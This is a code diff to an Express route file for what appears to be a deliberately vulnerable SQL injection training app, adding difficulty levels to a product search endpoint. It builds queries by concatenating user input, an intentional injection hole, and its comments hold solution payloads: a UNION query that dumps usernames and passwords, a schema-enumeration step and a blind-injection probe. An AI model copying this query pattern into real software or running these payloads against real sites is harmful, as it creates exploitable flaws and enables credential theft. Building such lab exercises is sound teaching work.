@@ -5,10 +5,13 @@ var session;
 const sqlite3 = require('sqlite3').verbose()
 const { Sequelize, DataTypes } = require('sequelize');
 
+// Variable for the SQL injection difficulty
+var SQLInjectionDifficulty = 1;
+
 // Metadata for the user database
 const sequelize = new Sequelize({
     dialect: "sqlite",
-    storage: "databases/RTCPPDB"
+    storage: "databases/RTCPUDB"
 })
 
 
@@ -23,14 +26,57 @@ router.get('/', async function(req, res) {
 })
 
 router.get('/search', async function(req, res) {
+
+    if (SQLInjectionDifficulty == 0) {
     var query = "SELECT * FROM product WHERE name = '" + req.query.pname + "' AND released = 1"
+    // var query = "SELECT * FROM product WHERE released = 1 AND name = '" + req.query.pname + "'";
+    // Unreleased'-- (make sure that some product is actually unreleased)
 
-
-    // console.log(query);
+    try {
     const [results, metadata] = await sequelize.query(query);
     res.render("searchProducts.jade", {
         rows : results
     });
+    } catch (error) {
+        console.log(error)
+        res.redirect("back");
+    };
+
+
+    } else if (SQLInjectionDifficulty == 1) {
+
+    // Get Data from another table
+    // Step 1
+    // SELECT name, price, quantity FROM product WHERE released = 1 AND name = '' UNION SELECT type, name, tbl_name FROM sqlite_master --'
+
+    // Step 2
+    // SELECT name, price, quantity FROM product WHERE released = 1 AND name = '' UNION SELECT username, password, password FROM user --'   
+
+    // solution
+    // ' UNION SELECT username, password, password FROM user --
+
+    try {
+    var query = "SELECT name, price, quantity FROM product WHERE released = 1 AND name = '" + req.query.pname + "'";
+    const [results, metadata] = await sequelize.query(query);
+    res.render("searchProducts.jade", {
+        rows : results
+    });
+    } catch (error) {
+
+    }
+    } else if (SQLInjectionDifficulty == 3) {
+        // blind SQL injection. Very difficult to solve this task.
+        try {
+            // ' AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a
+            var query = "SELECT name, price, quantity FROM product WHERE released = 1 AND name = '" + req.query.pname + "'";
+            const [results, metadata] = await sequelize.query(query);
+            res.render("searchProducts.jade", {
+                rows : results
+            });
+            } catch (error) {
+                
+    }
+    }
   });
 
 
